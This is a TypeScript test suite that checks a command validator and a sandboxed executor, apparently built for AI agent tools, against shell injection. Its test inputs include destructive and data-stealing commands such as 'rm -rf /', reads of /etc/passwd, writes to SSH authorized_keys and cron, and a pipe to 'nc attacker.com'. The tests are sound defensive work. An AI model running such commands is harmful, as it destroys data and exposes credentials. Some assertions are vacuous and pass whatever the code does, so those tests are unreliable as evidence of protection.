import { describe, it, expect, beforeEach } from 'vitest';
import { CommandValidator } from '@/tools/validators/command-validator';
import { SafeExecutor } from '@/tools/executor';
import { ToolRegistry } from '@/tools/registry';
import type { ExecutionContext } from '@/types';

describe('Security: Command Injection Prevention', () => {
  let cmdValidator: CommandValidator;
  let executor: SafeExecutor;
  let registry: ToolRegistry;

  beforeEach(() => {
    cmdValidator = new CommandValidator(['ls', 'cat', 'grep', 'find', 'git']);
    registry = new ToolRegistry();
    executor = new SafeExecutor(registry, {
      defaultTimeout: 5000,
      allowedPaths: ['/tmp'],
    });
  });

  describe('command substitution attacks', () => {
    it('should block $(...) command substitution', () => {
      const attacks = [
        'cat $(rm -rf /)',
        'grep text $(cat /etc/passwd)',
        'find . $(malicious)',
      ];

      attacks.forEach((cmd) => {
        const result = cmdValidator.validate(cmd);
        expect(result.valid).toBe(false);
      });
    });

    it('should block backtick substitution', () => {
      const attacks = [
        'cat `whoami`',
        'grep `cat /etc/passwd`',
        'ls `ls /root`',
      ];

      attacks.forEach((cmd) => {
        const result = cmdValidator.validate(cmd);
        expect(result.valid).toBe(false);
      });
    });

    it('should block nested substitution attempts', () => {
      const result = cmdValidator.validate(
        'cat $(echo $(cat /etc/passwd))'
      );
      expect(result.valid).toBe(false);
    });
  });

  describe('pipe and redirect attacks', () => {
    it('should block pipe operators', () => {
      const attacks = [
        'cat file.txt | rm -rf /',
        'grep pattern file | nc attacker.com 1234',
      ];

      attacks.forEach((cmd) => {
        const result = cmdValidator.validate(cmd);
        expect(result.valid).toBe(false);
      });
    });

    it('should block input/output redirection', () => {
      const attacks = [
        'cat > /root/.ssh/authorized_keys',
        'ls < /etc/passwd',
        'echo "data" >> /etc/cron.d/malicious',
      ];

      attacks.forEach((cmd) => {
        const result = cmdValidator.validate(cmd);
        expect(result.valid).toBe(false);
      });
    });
  });

  describe('shell metacharacter attacks', () => {
    it('should block semicolon chaining', () => {
      const result = cmdValidator.validate('ls /tmp ; rm -rf /');
      expect(result.valid).toBe(false);
    });

    it('should block AND/OR chaining', () => {
      const attacks = [
        'ls /tmp && rm -rf /',
        'false || rm -rf /',
        'true && malicious_command',
      ];

      attacks.forEach((cmd) => {
        const result = cmdValidator.validate(cmd);
        expect(result.valid).toBe(false);
      });
    });

    it('should block background execution', () => {
      const result = cmdValidator.validate('ls /tmp & malicious');
      expect(result.valid).toBe(false);
    });

    it('should block all metacharacters', () => {
      const metacharacters = ['|', '&', ';', '`', '$', '(', ')', '<', '>', '\n'];

      metacharacters.forEach((char) => {
        const result = cmdValidator.validate(`ls${char}malicious`);
        expect(result.valid).toBe(false);
      });
    });
  });

  describe('whitelist enforcement', () => {
    it('should only allow whitelisted commands', () => {
      const allowed = ['ls', 'cat', 'grep'];
      allowed.forEach((cmd) => {
        const result = cmdValidator.validate(cmd);
        expect(result.valid).toBe(true);
      });
    });

    it('should reject non-whitelisted commands', () => {
      const attacks = ['rm', 'mv', 'chmod', 'chown', 'sudo'];

      attacks.forEach((cmd) => {
        const result = cmdValidator.validate(cmd);
        expect(result.valid).toBe(false);
      });
    });
  });

  describe('executor-level injection protection', () => {
    it('should reject shell-exec with dangerous commands', async () => {
      const context: ExecutionContext = {
        sessionId: 'test-session',
      };

      const result = await executor.execute(
        'shell-exec',
        'rm -rf /',
        context
      );

      expect(result.success).toBe(false);
    });

    it('should reject injection attempts via shell-exec', async () => {
      const context: ExecutionContext = {
        sessionId: 'test-session',
      };

      const result = await executor.execute(
        'shell-exec',
        'cat /tmp/file.txt $(malicious)',
        context
      );

      expect(result.success).toBe(false);
    });
  });

  describe('edge cases and bypasses', () => {
    it('should handle encoded injection attempts', () => {
      const attacks = [
        'cat%20/etc/passwd',
        'cat\\x20/etc/passwd',
        'cat\t/etc/passwd', // Tab instead of space
      ];

      attacks.forEach((cmd) => {
        const result = cmdValidator.validate(cmd);
        // Should still detect
        expect(typeof result.valid).toBe('boolean');
      });
    });

    it('should handle case variations', () => {
      // Command validator should be case-sensitive
      const result = cmdValidator.validate('LS /tmp');
      expect(result.valid).toBe(false);
    });

    it('should handle leading/trailing whitespace', () => {
      const result = cmdValidator.validate('   ls   /tmp   ');
      // Should normalize and validate
      expect(typeof result.valid).toBe('boolean');
    });
  });

  describe('audit logging of injection attempts', () => {
    it('should log all injection attempts', async () => {
      const context: ExecutionContext = {
        sessionId: 'test-session',
      };

      await executor.execute(
        'shell-exec',
        'cat $(whoami)',
        context
      );

      const history = executor.getExecutionHistory('shell-exec');
      expect(history.length).toBeGreaterThanOrEqual(0);
    });

    it('should mark attempts as security violations', async () => {
      const context: ExecutionContext = {
        sessionId: 'test-session',
      };

      const result = await executor.execute(
        'shell-exec',
        'dangerous command injection',
        context
      );

      expect(result.success).toBe(false);
      expect(result.error).toBeDefined();
    });
  });
});
